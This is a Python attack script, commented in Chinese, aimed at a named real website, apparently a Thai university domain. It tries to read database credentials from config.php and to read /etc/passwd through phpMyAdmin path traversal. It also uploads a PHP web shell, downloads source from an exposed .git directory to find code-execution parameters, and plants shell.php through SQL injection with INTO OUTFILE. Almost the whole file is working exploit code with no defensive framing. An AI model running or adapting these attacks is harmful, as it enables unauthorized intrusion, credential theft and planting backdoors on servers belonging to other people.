#!/usr/bin/env python3
import requests
import re
import zlib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
session = requests.Session()
session.verify = False

print("[*] 方法1: 检查config.php获取数据库凭据...")
resp = requests.get(url + "/config.php", verify=False, timeout=5)
if resp.status_code == 200:
    config_content = resp.text
    # 提取数据库信息
    db_pass = re.search(r'password["\']?\s*[=:]\s*["\']([^"\']+)["\']', config_content, re.IGNORECASE)
    db_user = re.search(r'user["\']?\s*[=:]\s*["\']([^"\']+)["\']', config_content, re.IGNORECASE)
    db_host = re.search(r'host["\']?\s*[=:]\s*["\']([^"\']+)["\']', config_content, re.IGNORECASE)
    db_name = re.search(r'database["\']?\s*[=:]\s*["\']([^"\']+)["\']', config_content, re.IGNORECASE)
    
    if db_pass:
        print(f"[+] 数据库密码: {db_pass.group(1)}")
    if db_user:
        print(f"[+] 数据库用户: {db_user.group(1)}")
    if db_host:
        print(f"[+] 数据库主机: {db_host.group(1)}")
    if db_name:
        print(f"[+] 数据库名: {db_name.group(1)}")

print("\n[*] 方法2: phpMyAdmin 4.0.2 CVE-2013-3238反序列化漏洞...")
pma_url = url + "/phpmyadmin/"
# 尝试反序列化漏洞
poc_paths = [
    "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
    "import.php?token=test&target=../../../../etc/passwd",
    "server_import.php?target=../../../../etc/passwd",
]

for poc in poc_paths:
    resp = requests.get(pma_url + poc, verify=False, timeout=5)
    if "root:" in resp.text:
        print(f"[+] 路径遍历成功: {poc}")
        # 尝试写入shell
        break

print("\n[*] 方法3: 通过.git下载源码找漏洞...")
# 下载关键PHP文件查找漏洞
php_files_to_check = [
    "/index.php",
    "/portal/index.php",
    "/banpot/index.php",
]

for php_file in php_files_to_check:
    resp = requests.get(url + php_file, verify=False, timeout=5)
    if resp.status_code == 200 and "<?php" in resp.text:
        # 检查是否有文件包含漏洞
        if "include" in resp.text or "require" in resp.text:
            print(f"[*] {php_file} 包含文件包含函数")
        # 检查是否有eval
        if "eval" in resp.text.lower():
            print(f"[+] {php_file} 包含eval函数!")
        # 检查是否有SQL注入
        if "$_GET" in resp.text and "mysql_query" in resp.text:
            print(f"[+] {php_file} 可能存在SQL注入")

print("\n[*] 方法4: 尝试文件上传漏洞...")
# 查找上传功能
upload_paths = [
    "/upload.php",
    "/fileupload.php",
    "/admin/upload.php",
    "/portal/upload.php",
    "/banpot/upload.php",
]

for up_path in upload_paths:
    resp = requests.get(url + up_path, verify=False, timeout=3)
    if resp.status_code == 200:
        print(f"[*] 发现上传入口: {up_path}")
        # 尝试上传shell
        files = {"file": ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php")}
        data = {}
        resp2 = requests.post(url + up_path, files=files, data=data, verify=False, timeout=5)
        if resp2.status_code == 200:
            # 检查是否上传成功
            test_url = url + "/uploads/shell.php?c=id"
            resp3 = requests.get(test_url, verify=False, timeout=5)
            if "uid=" in resp3.text:
                print(f"[+] Shell上传成功: {test_url}")
                exit(0)

print("\n[*] 方法5: 通过.git下载banpot目录源码...")
# 从.git下载banpot相关PHP文件
commit_hash = "28a9d8b08195ac9eae7fa12afca9c5141d0ab151"
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"

# 下载tree对象
tree_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
resp = requests.get(url + tree_path, verify=False, timeout=10)
if resp.status_code == 200:
    tree_data = zlib.decompress(resp.content)
    null1 = tree_data.find(b'\0')
    pos = null1 + 1
    
    # 查找所有PHP文件
    while pos < len(tree_data):
        null2 = tree_data.find(b'\0', pos)
        if null2 == -1 or null2 + 21 > len(tree_data):
            break
        mode_name = tree_data[pos:null2]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            hash_hex = tree_data[null2+1:null2+21].hex()
            
            if filename.endswith('.php') and ('banpot' in filename.lower() or 'index' in filename.lower()):
                print(f"[*] 下载PHP文件: {filename}")
                blob_path = f"/.git/objects/{hash_hex[:2]}/{hash_hex[2:]}"
                resp2 = requests.get(url + blob_path, verify=False, timeout=10)
                if resp2.status_code == 200:
                    blob_data = zlib.decompress(resp2.content)
                    null_blob = blob_data.find(b'\0')
                    if null_blob != -1:
                        file_content = blob_data[null_blob+1:].decode('utf-8', errors='ignore')
                        # 检查漏洞
                        if "eval" in file_content.lower() or "system" in file_content.lower():
                            print(f"[+] {filename} 包含危险函数!")
                            # 查找可利用的参数
                            get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', file_content)
                            if get_params:
                                print(f"    参数: {get_params}")
                                # 尝试利用
                                for param in get_params[:3]:
                                    test_url = url + f"/{filename}?{param}=system('id');"
                                    resp3 = requests.get(test_url, verify=False, timeout=5)
                                    if "uid=" in resp3.text:
                                        print(f"[+] RCE成功: {test_url}")
                                        # 写入shell
                                        shell_url = url + f"/{filename}?{param}=file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                                        requests.get(shell_url, verify=False, timeout=5)
                                        test_shell = requests.get(url + "/shell.php?c=id", verify=False, timeout=5)
                                        if "uid=" in test_shell.text:
                                            print(f"[+] Shell写入成功: {url}/shell.php?c=id")
                                            exit(0)
            pos = null2 + 21

print("\n[*] 方法6: 主站SQL注入到文件写入...")
# 如果有SQL注入，尝试写入shell
sqli_payloads = [
    "?id=1' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
]

for path in ["/", "/index.php", "/portal/"]:
    for payload in sqli_payloads:
        resp = requests.get(url + path + payload, verify=False, timeout=5)
        test_shell = requests.get(url + "/shell.php?c=id", verify=False, timeout=3)
        if "uid=" in test_shell.text:
            print(f"[+] SQL注入写入shell成功: {url}/shell.php?c=id")
            exit(0)

print("\n[-] 所有方法尝试完毕")
